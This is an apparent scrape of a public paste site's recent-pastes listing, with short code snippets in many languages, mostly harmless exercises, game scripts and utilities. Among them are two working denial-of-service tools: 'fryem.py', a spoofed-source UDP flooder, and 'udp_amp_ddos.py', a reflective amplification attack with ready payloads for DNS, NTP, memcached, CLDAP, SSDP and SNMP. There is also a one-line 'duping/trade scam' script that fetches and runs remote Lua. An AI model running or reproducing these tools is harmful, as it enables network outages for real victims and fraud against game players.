    static void DrawBar(int startingPositionOfLine, int endOfLine, ref string bar)
    {
        for (int i = startingPositionOfLine; i < endOfLine; i++)
        {
            bar += ' ';
        }
    }
}"
xnpDNMyU,Untitled,Farz0l1x,Python,Wednesday 1st of May 2024 04:19:02 AM CDT,"file = open('1.txt')
K = int(file.readline())
N = int(file.readline())
a = []
for i in range(N):
    st, end = map(int, file.readline().split())
    a.append((st, end))
a.sort()
camera = [0] * K
count = 0
last_camera = 0
for i in range(N):
    st, end = a[i]
    for j in range(K):
        if camera[j] < st:
            camera[j] = end
            count += 1
            last_camera = j + 1
            break
print(count, last_camera)"
q7HYEac0,correct number of plies between fen1 a fen2,max2201111,Python,Wednesday 1st of May 2024 04:08:03 AM CDT,"import chess

def simplify_fen_string(fen):
    """"""Odstraní z FEN řetězce části týkající se počtu tahů, zachovává pozici, hráče na tahu, rošády a en passant.""""""
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Zachováváme informace o pozici, hráči na tahu, rošádách a en passant
    return simplified_fen

def bfs_shortest_path(start_fen, goal_fen):
    """"""Vyhledává nejkratší cestu mezi dvěma FEN pozicemi pomocí BFS algoritmu.""""""
    start_fen = simplify_fen_string(start_fen)  # Zjednodušení vstupního FEN
    goal_fen = simplify_fen_string(goal_fen)  # Zjednodušení cílového FEN
    board = chess.Board(start_fen)
    queue = [(board, 0)]  # fronta pro BFS, obsahuje dvojice (šachovnice, hloubka)
    visited = set()
    visited.add(start_fen)
    
    while queue:
        current_board, depth = queue.pop(0)
        current_fen = simplify_fen_string(current_board.fen())
        if current_fen == goal_fen:
            return depth
        
        for move in current_board.legal_moves:
            current_board.push(move)
            fen = simplify_fen_string(current_board.fen())
            if fen not in visited:
                visited.add(fen)
                queue.append((current_board.copy(), depth + 1))
            current_board.pop()
    
    return None  # cesta nebyla nalezena

# Zadání FEN pozic
start_fen = ""8/5k2/8/8/8/8/8/1KQ5 w - - 0 1""
goal_fen = ""8/8/5k2/8/8/4Q3/8/1K6 w - - 0 1""

# Spuštění BFS vyhledávání
path_length = bfs_shortest_path(start_fen, goal_fen)
print(f""Nejkratší cesta z {start_fen} do {goal_fen} je {path_length} tahů."")
"
cLsczTjq,ReadInt Func,SaNik74,C#,Wednesday 1st of May 2024 03:34:07 AM CDT,"namespace ReadInt
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int number = GetNumber();
            Console.WriteLine($""Вы ввели число - {number}"");
        }

        public static int GetNumber()
        {
            bool isWorking = true;
            int number = 0;

            while (isWorking)
            {
                Console.WriteLine(""Введите число"");

                bool isSuccess = int.TryParse(Console.ReadLine(), out number);

                if (isSuccess)
                {
                    isWorking = false;
                }
                else
                {
                    Console.WriteLine(""Ошибка, нужно вводить число. Повторите еще раз."");
                    Console.ReadKey();
                    Console.Clear();
                }
            }

            return number;
        }
    }
}"
xeyDLbKQ,snowy robo manual,coinwalk,JavaScript,Wednesday 1st of May 2024 03:28:04 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var dividedby = 1000;
var rift = (dividedby/25);
var monkey = Number((olsenest/dividedby).toFixed(8));
var dust = (monkey/2);
var bolux = monkey;
var tens = (monkey*10);
var hundreds = (monkey*200);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var olsen = 0;
var chickendinner = (olsenest*24);
var belance = olsenest;
var solvert = olsenest;
var silvery = olsenest;
var bob = false;
 
function go(){
belance = document.getElementById('pct_balance').value;
var dog = Number((belance-olsenest).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance!=olsen)){
    bolux = bolux*2;
    olsen = parseFloat(belance);
}
if ((((belance-(solvert-hundreds))-(bolux*2))<=0)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    solvert = parseFloat(belance);
silvery= parseFloat(belance);
}
if (((belance-(bolux*rift))<=0)&&(belance>=silvery)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    solvert = parseFloat(belance);
silvery= parseFloat(belance);
}
if (belance>silvery){
silvery= parseFloat(belance);
}
if (belance>=chickendinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1000);
}
go();
"
mQ0MTDrn,111,NeshZul,GDScript,Wednesday 1st of May 2024 03:03:39 AM CDT,"extends KinematicBody2D


var bullet = load(""res://bullet_laser.tscn"")

var score = 0
var dir
var turn_speed = 0.02

var speed = 1800
var friction = 0.008
var acceleration = 0.004
var velocity = Vector2.ZERO


onready var damp_effect = $Thrust_patricles.get_process_material()
onready var gun_laser = $gun_laser
onready var tween = $Tween
onready var camera =$Camera2D

var zoom_1 = Vector2(1,1)
var zoom_5 = Vector2(5,5)
var zoom_max = Vector2(30,30)

func _ready():
	GameState.player = self
func _process(delta):
	var gun_laser_pos = gun_laser.position
	damp_effect.damping = 100 - (velocity.length())
#	print(velocity.length())
	_rotate()
	var input_velocity = Vector2.ZERO
	# Check input for ""desired"" velocity
	if Input.is_action_pressed(""lean_right""):
		input_velocity.x += 1
	if Input.is_action_pressed(""lean_left""):
		input_velocity.x -= 1
	if Input.is_action_pressed(""back""):
		input_velocity.y += 1
	if Input.is_action_pressed(""forward""):
		input_velocity.y -= 1


	input_velocity = input_velocity.normalized() * speed

	if Input.is_action_just_pressed(""friction_off""):
		friction = 0.000000000000001
	if Input.is_action_just_released(""friction_off""):
		friction = 0.008
	if Input.is_action_just_released(""click_right""):
		var dir_bullet = (get_global_mouse_position() - position).normalized()
		var instance_bullet= bullet.instance()
		instance_bullet.position = gun_laser.get_global_transform().origin
		instance_bullet.rotation = gun_laser.rotation
		if velocity.length() > 300:
			instance_bullet.dir = dir_bullet * velocity.length()/100
		else:
			instance_bullet.dir = dir_bullet *2
		get_parent().add_child(instance_bullet)

	# If there's input, accelerate to the input velocity
	if input_velocity.length() > 0:
		velocity = velocity.linear_interpolate(input_velocity, acceleration)
	else:
		# If there's no input, slow down to (0, 0)
		velocity = velocity.linear_interpolate(Vector2.ZERO, friction)
	velocity = move_and_slide(velocity)

func _rotate():
	dir = get_angle_to(get_global_mouse_position())
	if abs(dir) < turn_speed:
		rotation += dir
	else:
		if dir > 0: rotation += turn_speed #clockwise
		if dir < 0: rotation -= turn_speed #anit - clockwise

func _input(event):
	if event is InputEventMouseButton:
		if camera.zoom == zoom_1 and event.button_index == BUTTON_WHEEL_DOWN:
			## smooth
			tween.stop_all()
			tween.interpolate_property(camera, ""zoom"" , zoom_1,  zoom_5, 0.25,Tween.TRANS_CUBIC )
			tween.start()
		if camera.zoom == zoom_5 and event.button_index == BUTTON_WHEEL_UP:
			tween.stop_all()
			tween.interpolate_property(camera, ""zoom"" , zoom_5,  zoom_1, 0.25,Tween.TRANS_CUBIC )
			tween.start()
"
76hLjJa2,Zoe's Reactor Controller,TwitchBlade,Lua,Wednesday 1st of May 2024 02:13:29 AM CDT,"function handleReactor()
  while true do
    if (r.getDamagePercent() > 0) and r.getStatus() then
      r.scram()
      cb.sendMessage(""Zoe's Reactor shut down due to damage"", ""Reactor Monitor"")
      term.setCursorPos(1,1)
      term.write(""Reactor Damage : "" .. r.getDamagePercent() .. ""%     "")
    else
      term.setCursorPos(1,1)
      term.write(""Reactor Damage : "" .. r.getDamagePercent() .. ""%     "")
    end
  end
end

function waitForPlayerJoin()
  local event, username, dimension = os.pullEvent(""playerJoin"")
  if username==""zozerelli"" then
    os.sleep(10)
    if r.getStatus() then
      cb.sendMessage(""Zoe's Reactor is running normally at "" .. r.getBurnRate() .. ""mb/t"", ""Reactor Monitor"")
    else
      cb.sendMessage(""Zoe's Reactor is shut down, maintenence required!"", ""Reactor Monitor"")
    end
  end
end





r = peripheral.wrap(""back"")
cb = peripheral.wrap(""left"")
pd = peripheral.wrap(""right"")
term.clear()
while true do
  parallel.waitForAny(handleReactor, waitForPlayerJoin)
  os.sleep(0.05)
end"
EPAnSDUm,DL12L3W,TitanOP,Python,Wednesday 1st of May 2024 02:10:28 AM CDT,"# Functions
def check_nan_values(df):
    nan_columns = df.columns[df.isnull().any()].tolist()
 
    if not nan_columns:
        print(""No NaN values found"")
    else:
        print(""NaN values found in: "")
        for column in nan_columns:
            print(f""{column}: {df[column].isnull().sum()} NaN values"")
            
def bar_plot(variable):
    # get feature
    var = train_df[variable]
    varValue = var.value_counts()
    
    # visualize
    plt.figure(figsize = (9,3))
    plt.bar(varValue.index, varValue)
    plt.xticks(varValue.index, varValue.index.values)
    plt.ylabel(""Frequency"")
    plt.title(variable)
    plt.show()
    print(""{}: \n {}"".format(variable,varValue))
    
def pie_plot(variable):
    # get feature
    var = train_df[variable]
    varValue = var.value_counts()
    
    varValue.plot.pie(autopct='%1.1f%%', textprops={'fontsize':12}).set_title(""Frequency"")
    print(""{}: \n {}"".format(variable,varValue))
    
df['column'] = df['column'].fillna(value)

df.drop('a', axis=1, inplace=True) 

df[['A', 'B']] = df['AB'].str.split(' ', n=1, expand=True)

df.iloc[0:2, df.columns.get_loc('Taste')] = 'good' (row, col)

# Select Columns 'B' through 'D'
selected_columns = df.loc[:, 'B':'D']

# Select Rows Between 'Row_2' and 'Row_4'
selected_rows = df.loc['Row_2':'Row_4']"
4EyBY8ui,Tool With Stacks (Tool Stacks System),Sungmingamerpro13,CSS,Wednesday 1st of May 2024 01:14:30 AM CDT,"local Tool = script.Parent

local player = game.Players.LocalPlayer
local ChangedText = player.PlayerGui:WaitForChild(""BackpackGui"").Frame.ChangedText

Tool:WaitForChild(""stacks"").Changed:Connect(function(value)
	ChangedText.Text = ""Changed: ""..value
end)

ChangedText.Text = ""Changed: ""..Tool.stacks.Value

Tool.Activated:Connect(function()
	Tool.stacks.Value -= 1
	
	if Tool.stacks.Value == 0 then
		Tool:Destroy()
		ChangedText.Visible = false
	end
end)

Tool.Equipped:Connect(function()
	ChangedText.Visible = true
end)

Tool.Unequipped:Connect(function()
	ChangedText.Visible = false
end)
"
Tz7x96q3,Backup de Arquivos JPG e PNG ver. 3,MizunoBrasil,Python,Tuesday 30th of April 2024 10:44:24 PM CDT,"import tkinter as tk
from tkinter import filedialog, messagebox
import os
import shutil
from datetime import datetime
import threading
import win32gui
import win32con

def esconder_janela_terminal():
    janela_terminal = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(janela_terminal, win32con.SW_MINIMIZE)

def copiar_arquivos(origem, destino, tipos_arquivos):
    esconder_janela_terminal()
    
    if not origem:
        return
    
    if not os.path.exists(destino):
        os.makedirs(destino)
    
    def copiar():
        for arquivo in os.listdir(origem):
            caminho_arquivo = os.path.join(origem, arquivo)
            if os.path.isfile(caminho_arquivo):  # Verifica se é um arquivo
                if tipos_arquivos == ""Imagens"" and (arquivo.endswith("".jpg"") or arquivo.endswith("".png"") or arquivo.endswith("".webp"")):
                    copiar_arquivo(caminho_arquivo, destino)
                elif tipos_arquivos == ""Vídeos"" and (arquivo.endswith("".mp4"") or arquivo.endswith("".avi"") or arquivo.endswith("".mkv"") or arquivo.endswith("".webm"") or arquivo.endswith("".mov"")):
                    copiar_arquivo(caminho_arquivo, destino)
                elif tipos_arquivos == ""Todos"":
                    copiar_arquivo(caminho_arquivo, destino)
                        
        messagebox.showinfo(""Sucesso"", ""Os arquivos foram copiados com sucesso."")
    
    thread = threading.Thread(target=copiar)
    thread.start()

def copiar_arquivo(origem, destino):
    data_criacao = datetime.fromtimestamp(os.path.getctime(origem))
    pasta_destino = os.path.join(destino, data_criacao.strftime('%d-%m-%Y'))
    if not os.path.exists(pasta_destino):
        os.makedirs(pasta_destino)
    shutil.copy(origem, pasta_destino)

def selecionar_destino():
    destino = filedialog.askdirectory(title=""Selecione a pasta de destino"")
    if destino:
        salvar_caminho(destino)
        texto_caminho.config(text=""Caminho de Destino: "" + destino)

def copiar_usando_caminho_salvo():
    caminho_destino = carregar_caminho()
    origem = filedialog.askdirectory(title=""Selecione a pasta de origem"")
    if origem:
        tipos_arquivos = var_tipo_arquivos.get()
        copiar_arquivos(origem, caminho_destino, tipos_arquivos)

def salvar_caminho(caminho):
    with open(""caminho_destino.txt"", ""w"") as arquivo:
        arquivo.write(caminho)

def carregar_caminho():
    if os.path.exists(""caminho_destino.txt""):
        with open(""caminho_destino.txt"", ""r"") as arquivo:
            return arquivo.read().strip()
    return """"

def abrir_explorador():
    caminho = carregar_caminho()
    if not caminho or not os.path.exists(caminho):
        caminho = os.getcwd()  # Diretório atual
    os.startfile(caminho)

janela = tk.Tk()
janela.title(""Backup de Arquivos - ver.3"")

largura = 400
altura = 300
largura_tela = janela.winfo_screenwidth()
altura_tela = janela.winfo_screenheight()
x = (largura_tela/2) - (largura/2)
y = (altura_tela/2) - (altura/2)
janela.geometry('%dx%d+%d+%d' % (largura, altura, x, y))

botao_destino = tk.Button(janela, text=""Selecionar Destino"", command=selecionar_destino)
botao_destino.pack(pady=10)

var_tipo_arquivos = tk.StringVar()
var_tipo_arquivos.set(""Todos"")

frame_tipos_arquivos = tk.LabelFrame(janela, text=""Tipos de Arquivos"")
frame_tipos_arquivos.pack(pady=10)

tk.Radiobutton(frame_tipos_arquivos, text=""Imagens"", variable=var_tipo_arquivos, value=""Imagens"").pack(anchor=tk.W)
tk.Radiobutton(frame_tipos_arquivos, text=""Vídeos"", variable=var_tipo_arquivos, value=""Vídeos"").pack(anchor=tk.W)
tk.Radiobutton(frame_tipos_arquivos, text=""Todos"", variable=var_tipo_arquivos, value=""Todos"").pack(anchor=tk.W)

botao_copiar = tk.Button(janela, text=""Selecionar pasta de origem"", command=copiar_usando_caminho_salvo)
botao_copiar.pack(pady=10)

botao_info = tk.Button(janela, text=""Abrir pasta de arquivos"", command=abrir_explorador, justify=tk.LEFT, fg=""blue"", cursor=""hand2"")
botao_info.pack(pady=10)

texto_caminho = tk.Label(janela, text=""Caminho de Destino: "" + carregar_caminho(), justify=tk.LEFT)
texto_caminho.pack(pady=10)

janela.mainloop()
"
41a4N9H0,Ps99 Duping/Trade Scam Script,k4ftt1,Lua,Tuesday 30th of April 2024 08:53:26 PM CDT,loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/main/72852ea0fccb274fa92d6523.lua'))()
w2w3xtnm,Untitled,CyMC888,Lua,Tuesday 30th of April 2024 08:41:20 PM CDT,"for i = 1, #blockData do

	local nextBlock = blockData[""block""..i]
    print(nextBlock)
    local temp = textutils.unserialize(nextBlock)

    if doorState then

    tempBlock = temp[""onBlock""]

    elseif not doorState then

    tempBlock = temp[""offBlock""]

    end

    commands.execAsync(""setblock ""..temp[""xPos""].."" ""..temp[""yPos""].."" ""..temp[""zPos""].."" ""..tempBlock)

end"
6vZKBP0T,fryem.py,betrayed,Python,Tuesday 30th of April 2024 08:20:29 PM CDT,"#!/usr/bin/env python3
import time, sys, threading, os, random, string
from scapy.all import *
from urllib.parse import urlparse

_abort = False
_ip = ''

def _udp(_min, _max):
    while _abort == False:
        try:
            payload = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=random.randint(int(_min), int(_max))))
            fake = '.'.join(str(random.randint(0, 255)) for _ in range(4))
            pkt = IP(dst=_ip, src=fake) / UDP(sport=RandShort(), dport=int(sys.argv[2])) / payload.encode()
            send(pkt, verbose=False)
        except:
            pass

def _rslv():
    global _ip
    _host = sys.argv[1].lower()
    if not (_host.startswith(""http://"") or _host.startswith(""htts://"")):
        _host = ""http://"" + _host
        
    try:
        _domain = urlparse(_host).netloc
        _ip = socket.gethostbyname(_domain)
    except:
        sys.exit(""\r\n DNS resolution failed! Exiting...\r\n"")
        
def main():
    if len(sys.argv) != 6:
        sys.exit(""\r\n Usage: <ip/url> <port> <byte range: x-y> <time> <threading>\r\n"")
        
    if not os.geteuid() == 0:
        sys.exit(""\r\n Script requires root elevation!\r\n"")
        
    try:
        _min, _max = sys.argv[3].split(""-"")
    except:
        sys.exit(""\r\n Invalid byte range detected! Exiting...\r\n"")
    
    os.system('clear')
    global _abort, _ip
    _rslv()
        
    print('''
   █████▒    ██▀███     ▓██   ██▓    ██▓   ▓█████     ███▄ ▄███▓
 ▓██   ▒    ▓██ ▒ ██▒    ▒██  ██▒   ▓█▀▒   ▓█   ▀    ▓██▒▀█▀ ██▒
 ▒████ ░    ▓██ ░▄█ ▒     ▒██ ██░   ▒▀     ▒███      ▓██    ▓██░
 ░▓█▒  ░    ▒██▀▀█▄       ░ ▐██▓░   ░      ▒▓█  ▄    ▒██    ▒██ 
 ░▒█░       ░██▓ ▒██▒     ░ ██▒▓░          ░▒████▒   ▒██▒   ░██▒
  ▒ ░       ░ ▒▓ ░▒▓░      ██▒▒▒           ░░ ▒░ ░   ░ ▒░   ░  ░
  ░           ░▒ ░ ▒░    ▓██ ░▒░            ░ ░  ░   ░  ░      ░
  ░ ░         ░░   ░     ▒ ▒ ░░               ░      ░      ░   
               ░         ░ ░                  ░  ░          ░
                         ░ ░                                    
''')
    print("" THeiR roUTeR iS $iZZlinG! MeLtiNg "" + _ip + "":"" + sys.argv[2] + "" fOr "" + sys.argv[4] + "" sEcOnDs...\r\n"")

    tasks = []
    for x in range(0, int(sys.argv[5])):
        x = threading.Thread(target=_udp, args=(_min, _max))
        tasks.append(x)
        x.start()
        
    _quit = time.time() + int(sys.argv[4])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass
        
    _abort = True
    
    for y in tasks:
        y.join()
        
    sys.exit('\r\n DoNe...\r\n')

if __name__ == ""__main__"":
    main()
"
THs1S9jC,Just In! Genuine Student Test Commencement in March 2024,ONEderland,HTML,Tuesday 30th of April 2024 08:18:18 PM CDT,https://onederland.com.au/genuine-student-test-commencement/
PeZkKYdB,udp_amp_ddos.py,betrayed,Python,Tuesday 30th of April 2024 08:16:51 PM CDT,"# Quickly thrown together UDP-AMP (aka: UDP MIX) Distributed Reflective Denial-of-Service attack 
# Supports known UDP amplified/reflective service abuse:
#   DNS, RIP, DVR, WSD, MEMCACHE, Microsoft SQL, NTP, CLDAP, LDAP, 
#   Chargen, RDP, SSDP, SNMP, UBIQUITI, Apple RDP, etc. 

# use the AMP scanner on this page to find vulnerable hosts.
# I'll drop fresh reflectors here in a second...

# This has been roughly field-tested. DStat graphs and Wireshark captures confirming traffic, etc
# Still some bugs may be present. More testing is recommended. 
# Programmed by Betrayed

import time, sys, os, random, threading
from scapy.all import *
from urllib.parse import urlparse

_abort = False
_vuln = []
_wsd = [
    '<s:Envelope><s:Header><a:MessageID>a</a:MessageID></s:Header><s:Body><d:Probe><d:Types>wsdp:Device</d:Types></d:Probe></s:Body></s:Envelope>',
    '<:Envelope><:Header><:MessageID>a</:MessageID></:Header><:Body><:Probe></:Probe></:Body></:Envelope>',
    '<Envelope><Body><Probe></Probe></Body></Envelope>'
]

def _mix(_victim):
    global _vuln, _wsd
    _Server, _prt = '127.0.0.1', 80
    i = 0

    while _abort == False:
        try:
            try:
                entry = _vuln[i]
                _Server, _prt = entry.strip().split(':')
            except:
                _Server, _prt = '127.0.0.1', '80'
            
            pkt = IP()
            payload = b''
            
            if int(_prt) == 53: # DNS
               pkt = IP(dst=_Server, src=_victim) / UDP(sport=RandShort(), dport=53) / DNS(rd=1,opcode=0,qd=DNSQR(qname='www.example.com',qclass=""IN"",qtype=""A""))
            
            elif int(_prt) == 520: # RIP
               payload = b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10'
               packet = IP(dst=_Server, src=_victim) / UDP(sport=RandShort(), dport=520) / payload
            
            elif (int(_prt) == 37777 or int(_prt) ==37778 or int(_prt) ==37810): # DVR
               payload = b'\x44\x48\x49\x50'
               pkt = IP(dst=_Server, src=_victim) / UDP(sport=RandShort(), dport=int(_prt)) /  payload #Raw(load=data)
            
            elif int(_prt) == 3702: # WS-DISCOVERY
               payload = random.choice(_wsd)
               pkt = IP(dst=_Server,src=_victim)/UDP(sport=44206,dport=3702)/ payload.encode()
            
            elif int(_prt) == 11211: # MEMCACHE
               payload = b'\x00\x00\x00\x00\x00\x01\x00\x00get injected\r\n'
               #          '\x00\x01\x00\x00\x00\x01\x00\x00get injected\n'
               pkt = IP(dst=_Server, src=_victim) / UDP(sport=random.randint(2000,65535), dport=11211) / Raw(load=data)
            
            elif int(_prt) == 1433: # MSSQL
               payload = b'\x02'
               pkt = IP(dst=_Server,src=_victim)/UDP(sport=44206,dport=1434)/ payload #Raw(load=data)
            
            elif int(_prt) == 123: # NTP
               payload = b'\x17\x00\x03\x2a\x00\x00\x00\x00'    # or ""\x17\x00\x03\x2a"" + ""\x00"" * 4
               pkt = IP(dst=_Server, src=_victim)/UDP(sport=random.randint(2000,65535), dport=123)/Raw(load=data)
            
            elif int(_prt) == 389: # CLDAP
               payload = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                          b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00')
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=src_port, dport=389) / payload
               
            elif int(_prt) == 636: # LDAP alt
               payload = (b'\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00'
                          b'\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63'
                          b'\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00')
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=src_port, dport=636) / payload
            
            elif int(_prt) == 19: # CHARGEN
                payload = b'\x01'
                pkt = IP(dst=_Server, src=_victim) / UDP(sport=random.randint(2000,65535), dport=19)/ Raw(load=payload)
            
            elif int(_prt) == 3389: # RDP
               payload = b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00'
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=src_port, dport=3389) / payload
            
            elif int(_prt) == 1900: # SSDP
               payload = ""M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \""ssdp:discover\""\r\nMX: 2\r\nST: ssdp:all\r\n\r\n""
               pkt = IP(dst=_Server, src=_victim) / UDP(sport=1900,dport=1900) / Raw(load=payload)
            
            elif int(_prt) == 161: # SNMP
               payload = ""\x30\x37\x02\x01"" #snmp
               payload += ""\x01"" #v2
               payload += ""\x04\x06\x70\x75\x62\x6c\x69\x63"" #community=public
               payload += ""\xa5\x2a\x02\x04\x06\x29\x07\x31\x02\x01\x00\x02\x01\x0a\x30\x1c\x30\x0b\x06\x07\x2b\x06\x01\x02\x01\x01\x01\x05\x00\x30\x0d\x06\x09\x2b\x06\x01\x02\x01\x01\x09\x01\x03\x05\x00"" #getBulkRequest
               pkt = IP(dst=_Server, src=_victim)/UDP(sport=161,dport=161)/Raw(load=data)
            
            elif int(_prt) == 10001: # UBIQUITI
               payload = b'\x01\x00\x00\x00'
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=src_port, dport=10001) / payload
            
            elif int(_prt) == 3283: # ARD
               payload = b'\x00\x14\x00\x00'
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=src_port, dport=3283) / payload
               
            elif int(_prt) == 1234: # Adware reflectors
               payload = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=random.randint(1000, 4096)))
               pkt = IP(src=_victim, dst=_Server) / UDP(sport=src_port, dport=1234) / payload.encode()

            else:
               payload = b'disrespect = disconnect'
               pkt = IP(src='69.420.13.37', dst=_victim) / UDP(sport=src_port, dport=80) / payload
            
            send(pkt, verbose=False)
            
            i+=1
            if i == len(_vuln):
                i = 0
        except KeyboardInterrupt:
            pass
    
    
def _rslv():
    _host = sys.argv[1]
    if not (_host.lower().startswith('http://') or _host.lower().startswith('https://')):
        _host = 'http://' + _host
    try:
        _domain = urlparse(_host).netloc
        _addr = socket.gethostbyname(_domain)
        return _addr
    except:
        sys.exit('\r\nDNS resolution error! Revalidate host.\r\n')


def main():
    os.system('clear')
    if len(sys.argv) != 5:
        sys.exit('\r\nUsage: <ip/url> <reflectors.txt ip:port> <time> <threading>\r\n')
        
    # ensure script has admin priviliges
    if not os.geteuid() == 0:
        sys.exit('\r\nScript requires root elevation!\r\n')
    
    global _abort, _wsd
    # url/domain -> ip
    _ip = _rslv()
    
    # add ip:port to list
    print('Importing reflector list. Please stand-by...\r\n')
    try:
        with open(sys.argv[2], ""r"") as f:
            for line in f:
                if ""\n"" in line:
                    # remove any carriage return/s
                    line = line.replace(""\n"", """")
                    _vuln.append(line)
                else:
                    _vuln.append(line)
    except KeyboardInterrupt:
        sys.exit('\r\nAborted by user.')
    except: #FileNotFoundError:
        sys.exit('\r\nCritical error encountered!\r\n')
    
    # thread execution
    tasks = []
    for x in range(0, int(sys.argv[4])):
        x = threading.Thread(target=_mix, args=(_ip,))
        tasks.append(x)
        x.start()
        
    # disrespect = disconnect
    print('Amplified UDP flood sent to ' + _ip + ' for ' + sys.argv[3] + ' seconds...\r\n')
    
    # wait duration of attack
    _quit = time.time() + int(sys.argv[3])
    try:
        while time.time() <= _quit:
            pass
    except KeyboardInterrupt:
        pass

    # power-down threads
    _abort = True
    for y in tasks:
        y.join()
        
    sys.exit('\r\nDone.\r\n')
    
if __name__ == ""__main__"":
    main()"
CC5jnufj,DeepClean,Landerin,Batch,Tuesday 30th of April 2024 07:52:39 PM CDT,":: Deep cleans the Sims3 cache files
:: (PLACE IN YOUR 'Documents\Electronic Arts\The Sims 3' folder and run)
:: Obligatory ""I am not liable if this breaks your shit"" message

@echo off
setlocal

if exist DeviceConfig.log (

  del ""CASPartCache.package""
  del ""compositorCache.package""
  del ""scriptCache.package""
  del ""simCompositorCache.package""
  del ""socialCache.package""

  del ""DCCache\dcdb0.dbc""
  del ""DCCache\missingdeps.idx""

  del /Q ""Downloads\*.bin""

  del /Q ""SigsCache\*.bin""

  del /Q ""Thumbnails\*.package""

  if exist FeaturedItems\ (
    del /Q ""FeaturedItems\*""
    rd FeaturedItems
    type nul > FeaturedItems
  )

  del /Q ""WorldCaches\*""

  for %%a in (""DCBackup\*"") do if /i not ""%%~nxa""==""ccmerged.package"" del ""%%a""

  del -Q xcpt*
  del -Q ScriptError_DESKTOP*
  del -Q ScriptError_LAPTOP*

) else (
  echo ""This file does not appear to be in the correct directory! Please place this file in your 'Documents\Electronic Arts\The Sims 3' folder.""
  pause
)

GOTO :EOF"
Due3FuV0,Untitled,matbensch,C++,Tuesday 30th of April 2024 07:49:53 PM CDT,"#include <bits/stdc++.h>
using namespace std;

// define pi
const double PI = 3.14159265359;

// compute the DFT of x or the IDFT if invert
void dft(vector<complex<double>>& x, bool invert = false) {
    int N = x.size();
    if (N <= 1) return;

    // spilt x into its even-indexed and odd-indexed terms 
    vector<complex<double>> E(N / 2), O(N / 2);
    for (int i = 0; i < N / 2; i++) E[i] = x[2*i], O[i] = x[2*i+1];

    // compute the DFT/IDFT of each half    
    dft(E, invert);
    dft(O, invert);

    // w_k are the Nth roots of unity
    complex<double> w(1);
    double theta = 2 * PI / N * (invert ? -1 : 1);
    complex<double> rot(cos(theta), sin(theta));
    
    // combine the halves
    for (int k = 0; k < N / 2; k++) {
        x[k] = E[k] + w * O[k];         // x[k] for k = 0...N/2-1
        x[k + N/2] = E[k] - w * O[k];   // x[k+N/2] by periodicity
        if (invert) x[k] /= 2, x[k + N / 2] /= 2;   // needed if inverting
        w *= rot; // rotate w to the next root of unity
    }
}

// compute the coefficients of A(x)*B(x) where a and b are the coefficients of A(x) and B(x) respectively
vector<int> poly_mul(vector<int>& a, vector<int>& b)
{
    // convert to complex data type
    vector<complex<double>> ca(a.begin(), a.end());
    vector<complex<double>> cb(b.begin(), b.end());
    vector<int> res;

    // zero pad a and b until length is a power of 2
    int N = 1;
    while(N < ca.size() + cb.size()) N <<= 1;
    ca.resize(N);
    cb.resize(N);
    
    // compute the DFT of A and B
    dft(ca);
    dft(cb);

    // multiply the results and compute the IDFT
    for(int i=0;i<N;i++) ca[i] *= cb[i];
    dft(ca, true);
    
    // extract the coefficients and return
    for(int i=0;i<N;i++) res.push_back(round(ca[i].real()));
    while(res[res.size()-1]==0) res.pop_back();
    return res;
}

int main()
{
    vector<int> a = {-1, 2, 5};
    vector<int> b = {1, 2};
    vector<int> ab = poly_mul(a, b);
    
    for(int e: ab) cout << e << ' '; cout << '\n';
}
"
gzD62m5x,Untitled,egraPA,C++,Tuesday 30th of April 2024 07:32:07 PM CDT,"#include <iostream>
#include <vector>
#include <math.h>
#include <complex>
#include <stdlib.h>
#include <sstream>
#include <iomanip>

using namespace std;
class Vector;

class Matrix {
    protected:
        vector<vector<double>> data;
        int n;
        int m;
    public:
        Matrix() {
            n = 0;
            m = 0;
        }
        Matrix (int x, int y) {
            n = x;
            m = y;
            data.assign(n, vector<double>(m, 0));
        }
        Matrix& operator+ (const Matrix& matrix) {
            if (matrix.m != m || matrix.n != n) {
                throw runtime_error(""Error: the dimensional problem occurred"");
            }
            Matrix *ans = new Matrix(n, m);
            for (int i = 0; i < n; i++) {
                for (int j = 0; j < m; j++) {
                    ans->data[i][j] = data[i][j] + matrix.data[i][j];
                }
            }
            return *ans;
        }
        Matrix& operator- (const Matrix& matrix) {
            if (matrix.m != m || matrix.n != n) {
                throw runtime_error(""Error: the dimensional problem occurred"");
            }
            Matrix *ans = new Matrix(n, m);
            for (int i = 0; i < n; i++) {
                for (int j = 0; j < m; j++) {
